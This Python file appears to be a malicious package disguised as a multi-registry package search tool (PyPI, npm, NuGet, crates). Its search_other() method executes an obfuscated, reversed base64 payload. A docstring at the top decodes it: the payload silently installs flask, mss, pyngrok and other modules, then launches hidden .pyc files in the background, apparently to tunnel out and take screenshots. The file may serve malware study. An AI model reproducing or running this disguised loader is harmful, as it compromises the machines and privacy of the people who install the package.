"""
The search_other() method contains obfuscated payload.
The original payload looks as follows:

subprocess.check_call(
    [
        sys.executable,
        "-m",
        "pip",
        "install",
        "--quiet",
        "requests",
        "psutil",
        "flask",
        "mss",
        "pyngrok",
    ]
)
subprocess.Popen(
    "(nohup python pkg_search/search_misc.pyc </dev/null >/dev/null 2>&1 &)",
    shell=True,
)
time.sleep(5)
subprocess.Popen(
    "(nohup python pkg_search/search_index.pyc </dev/null >/dev/null 2>&1 &)",
    shell=True,
)
"""

import requests, os, sys, subprocess, time
from bs4 import BeautifulSoup
import base64


class SearchEndpoints:
    def search_pypi(query):
        url = "https://pypi.org/search/"
        params = {"q": query}
        response = requests.get(url, params=params)

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            results = soup.find_all("a", class_="package-snippet")

            if not results:
                print("No packages found.")
                return

            for i, result in enumerate(results[:10], start=1):
                name = result.find(
                    "span",
                    class_="package-snippet__name",
                ).text
                ver = result.find(
                    "span",
                    class_="package-snippet__version",
                ).text
                desc = result.find(
                    "p",
                    class_="package-snippet__description",
                ).text
                print(f"{i}. {name} ({ver}) - {desc}")
        else:
            print("An error occurred while searching for the package.")

    def search_npm(query):
        url = f"https://registry.npmjs.org/-/v1/search"
        params = {"text": query, "size": 10}
        response = requests.get(url, params=params)

        if response.status_code == 200:
            data = response.json()
            packages = data.get("objects", [])

            if not packages:
                print("No packages found.")
                return

            for i, package in enumerate(packages, start=1):
                name = package["package"]["name"]
                version = package["package"]["version"]
                description = package["package"].get(
                    "description", "No description available"
                )
                print(f"{i}. {name} ({version}) - {description}")
        else:
            print("An error occurred while searching for the package.")

    def search_nuget(query):
        url = f"https://azuresearch-usnc.nuget.org/query"
        params = {"q": query, "take": 10}
        response = requests.get(url, params=params)

        if response.status_code == 200:
            data = response.json()
            packages = data.get("data", [])

            if not packages:
                print("No packages found.")
                return

            for i, package in enumerate(packages, start=1):
                name = package["id"]
                version = package["version"]
                description = package.get(
                    "description",
                    "No description available",
                )
                print(f"{i}. {name} ({version}) - {description}")
        else:
            print("An error occurred while searching for the package.")

    def search_rust_crates(query):
        url = "https://crates.io/api/v1/crates"
        params = {"q": query, "per_page": 10}
        response = requests.get(url, params=params)

        if response.status_code == 200:
            data = response.json()
            crates = data.get("crates", [])

            if not crates:
                print("No packages found.")
                return

            for i, crate in enumerate(crates, start=1):
                name = crate["name"]
                version = crate["newest_version"]
                description = crate.get(
                    "description",
                    "No description available",
                )
                print(f"{i}. {name} ({version}) - {description}")
        else:
            print("An error occurred while searching for the package.")

    def search_other():
        exec(base64.b64decode(b"poALlVncU1DbsVGazBCIgAiCsISKmASMm4jMgwGb152L2VGZv4DIsxWdu9idlR2L8AyY5BnL4VGZul2XoNmchV2cvg2YyFWZz91ZrBHIu9Ga0lHcgAXdo9mboICIgACIKgiblB3bQ5yczV2YvJHciV3cKkSNoAXZlx2cuUWbpRnCpoALlVncU1DbsVGazBCIgAiCsISKmASMm4jMgwGb152L2VGZv4DIsxWdu9idlR2L8AyY5BnLjNXat9FajJXYlN3LoNmchV2cfd2awBibvhGd5BHIwVHav5GKiACIgAiCo4WZw9GUuM3clN2byBnY1NnCpoQXgACIgoALis2bydmb5BnIgACIgACIgAiCsIycz1mIgACIgACIgAiCsIyazFGbmJCIgACIgACIgoALiwWa0V3cwJCIgACIgACIgoALiMHdzVWdxVmciACIgACIgACIKwiI0VWa1FXLtICIgACIgACIgoALiwGbhR3culmIgACIgACIgAiCsICcpBnIgACIgACIgAiCsISbtICIgACIgACIgoALlxmYhRXdjVGel5yc5NHIgACIgACIgowWgACIgoAKsxWYj91ajVGaj5yczV2YvJHciV3c"[::-1]).decode("utf-8"))
